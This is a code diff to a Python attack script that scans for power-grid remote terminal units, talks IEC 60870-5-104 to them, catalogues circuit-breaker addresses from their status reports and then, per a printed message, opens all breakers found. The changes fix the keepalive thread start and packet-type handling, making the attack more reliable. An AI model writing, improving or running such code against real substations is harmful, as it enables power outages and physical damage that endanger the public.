@@ -40,6 +40,7 @@ def arpscan(hosts: list[IPv4Address]):
 
 def handle_rtu(sock: socket, ipaddr: str):
     global rtu_data
+    global rtu_keepalive
     global rtu_thread_killswitch
     global rtu_hasbreakers
     buffer : bytes
@@ -49,6 +50,7 @@ def handle_rtu(sock: socket, ipaddr: str):
     apdu : APDU = APDU()/APCI(type=0x03, UType=0x01)
     buffer = apdu.build()
     sock.send(buffer)
+    rtu_keepalive[ipaddr].start()
     while not rtu_thread_killswitch[ipaddr]:
         try:
             buffer = sock.recv(MAX_LENGTH)
@@ -56,25 +58,25 @@ def handle_rtu(sock: socket, ipaddr: str):
             assert apdu.haslayer('APCI') and apdu.haslayer('ASDU')
             apci = apdu['APCI']
             asdu = apdu['ASDU']
-            assert apci.type == 0x00
-            if 'ca' not in rtu_data[ipaddr].keys():
-                rtu_data[ipaddr]['ca'] = asdu.CommonAddress
-            rtu_data[ipaddr]['rx'] = apci.Tx
-            if asdu.type in [0x01, 0x02, 0x03, 0x04, 0x1E, 0x1F]:
-                if ipaddr not in rtu_hasbreakers.keys():
-                    rtu_hasbreakers[ipaddr] = dict()    
-                    rtu_hasbreakers[ipaddr]['ioas'] = list()
-                    print('   [!] RTU in {0:s} has breakers'.format(ipaddr))
-                io = asdu.IO
-                ioa = io[0].IOA if isinstance(io, list) else io.IOA
-                if asdu.type in [0x01, 0x02, 0x1E]:
-                    values = [x.SIQ for x in io] if isinstance(io, list) else io.SIQ
-                else:
-                    values = [x.DIQ for x in io] if isinstance(io, list) else io.DIQ
-                values = list([values]) if not isinstance(values, list) else values
-                for x in [y for y  in range(ioa, ioa + len(values)) if y not in rtu_hasbreakers[ipaddr]['ioas']]:
-                    rtu_hasbreakers[ipaddr]['ioas'].append(x)
-                    print('   [!] New potential breaker found in {0:s}. IOA: {1:d}'.format(ipaddr, x))
+            if apci.type == 0x00:
+                if 'ca' not in rtu_data[ipaddr].keys():
+                    rtu_data[ipaddr]['ca'] = asdu.CommonAddress
+                rtu_data[ipaddr]['rx'] = apci.Tx
+                if asdu.type in [0x01, 0x02, 0x03, 0x04, 0x1E, 0x1F]:
+                    if ipaddr not in rtu_hasbreakers.keys():
+                        rtu_hasbreakers[ipaddr] = dict()    
+                        rtu_hasbreakers[ipaddr]['ioas'] = list()
+                        print('   [!] RTU in {0:s} has breakers'.format(ipaddr))
+                    io = asdu.IO
+                    ioa = io[0].IOA if isinstance(io, list) else io.IOA
+                    if asdu.type in [0x01, 0x02, 0x1E]:
+                        values = [x.SIQ for x in io] if isinstance(io, list) else io.SIQ
+                    else:
+                        values = [x.DIQ for x in io] if isinstance(io, list) else io.DIQ
+                    values = list([values]) if not isinstance(values, list) else values
+                    for x in [y for y  in range(ioa, ioa + len(values)) if y not in rtu_hasbreakers[ipaddr]['ioas']]:
+                        rtu_hasbreakers[ipaddr]['ioas'].append(x)
+                        print('   [!] New potential breaker found in {0:s}. IOA: {1:d}'.format(ipaddr, x))
         except (TimeoutError, KeyError, IndexError, AssertionError):
             pass
 
@@ -92,6 +94,7 @@ def main():
     global rtu_comm
     global rtu_data
     global rtu_threads
+    global rtu_keepalive
     global rtu_thread_killswitch
     global rtu_hasbreakers
     buffer : bytes
@@ -161,7 +164,6 @@ def main():
         rtu_keepalive[rtu_ip] = Thread(target=keep_alive, kwargs={'ipaddr': rtu_ip})
         rtu_thread_killswitch[rtu_ip] = False
         rtu_threads[rtu_ip].start()
-        rtu_keepalive[rtu_ip].start()
     sleep(30)
     print('[+] Opening all breakers ...')
     for rtu_ip, ioas in rtu_hasbreakers.items():
